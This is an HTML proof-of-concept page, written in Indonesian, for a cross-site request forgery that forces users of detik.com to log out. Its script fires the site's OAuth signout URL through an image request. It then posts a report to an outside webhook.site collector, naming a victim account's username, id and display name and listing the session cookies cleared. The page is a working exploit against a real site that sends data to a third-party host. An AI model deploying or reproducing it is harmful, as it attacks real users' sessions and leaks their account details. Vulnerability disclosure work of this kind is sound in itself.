<!DOCTYPE html>
<html>
<head>
    <title>CSRF Logout PoC - detik.com</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .box { background: #fff; max-width: 500px; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        h2 { color: #c0392b; }
        .btn { background: #c0392b; color: #fff; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
        .btn:hover { background: #a93226; }
        pre { background: #1a1a1a; color: #0f0; padding: 15px; text-align: left; border-radius: 5px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2> PoC: CSRF Logout - detik.com</h2>
        <p>Klik tombol ini untuk memicu logout paksa dari akun detik.com Anda.</p>
        <button class="btn" onclick="logout()">Trigger CSRF Logout</button>
        <p id="status"></p>
    </div>

    <script>
        function logout() {
            document.getElementById('status').innerHTML = 'Mengirim request logout...';
            
            // Kirim CSRF logout
            var img = new Image();
            img.src = 'https://connect.detik.com/oauth/signout?' + Date.now();
            
            // Kirim bukti ke webhook
            fetch('https://webhook.site/b66933ac-8fb1-4fc2-997c-5b6cdf43ff03', {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    csrf_logout: true,
                    victim: { username: 'januaul535693', id: 11778423, name: 'LazusHunting' },
                    session_cleared: ['sessionid','dts-sec','D_ISS','D_RA','D_DC','dc_csrf'],
                    triggered_from: window.location.href
                })
            });
            
            setTimeout(function() {
                document.getElementById('status').innerHTML = '✅ Session dihapus! Cek detik.com - Anda sudah logout.';
            }, 2000);
        }
    </script>
</body>
</html>
